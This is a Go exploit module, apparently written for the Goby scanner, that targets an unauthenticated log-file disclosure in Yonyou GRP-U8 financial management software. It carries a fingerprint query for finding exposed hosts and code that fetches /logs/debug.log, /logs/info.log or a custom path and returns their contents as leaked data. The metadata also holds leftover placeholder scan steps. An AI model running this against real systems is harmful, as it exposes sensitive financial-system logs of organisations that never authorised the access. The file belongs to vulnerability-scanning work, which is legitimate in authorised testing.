package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou GRP-U8 debug.log and info.log Information Disclosure Vulnerability",
    "Description": "<p>Yonyou GRP-U8 is a powerful financial management software that can help enterprises quickly and accurately conduct financial accounting and fund management.</p>",
    "Product": "yonyou-GRP-U8-Financial-Management-Software",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-13",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "(body=\"GRP-U8\" && body=\"./scripts/cookie.js\") || title=\"GRP-U8\"",
    "GobyQuery": "(body=\"GRP-U8\" && body=\"./scripts/cookie.js\") || title=\"GRP-U8\"",
    "Level": "0",
    "Impact": "<p>Its  has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "info.log,debug.log",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "用友GRP-U8 debug.log和info.log 信息泄漏漏洞",
            "Product": "用友GRP-U8财政管理软件",
            "Description": "<p>用友 GRP-U8 是一款功能强大的财务管理软件,可以帮助企业快速、准确地进行财务核算和资金管理。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>系统存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Yonyou GRP-U8 debug.log and info.log Information Disclosure Vulnerability",
            "Product": "yonyou-GRP-U8-Financial-Management-Software",
            "Description": "<p>Yonyou GRP-U8 is a powerful financial management software that can help enterprises quickly and accurately conduct financial accounting and fund management.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its&nbsp; has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`

	postOrGet_LIC1EV2G := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		defineHeader := map[string]string{}
		urlget := "/logs/" + fileUrl

		resp, err := setGetRequest(hostInfo, urlget, defineHeader)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/logs/debug.log"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"debug.log": "[ DEBUG ]",
				"info.log":  "[ INFO ]",
			}
			// 函数继承
			uploadFileFunc := postOrGet_LIC1EV2G

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"info.log":  {"info.log", "[ INFO ]"},
				"debug.log": {"debug.log", "[ DEBUG ]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_LIC1EV2G

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					expResult.Output = "请尝试读取另外一种日志文件"
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			
			expResult.Success = true
			expResult.Output = "泄露信息：日志信息\n" + resp
			return expResult
		},
	))
}
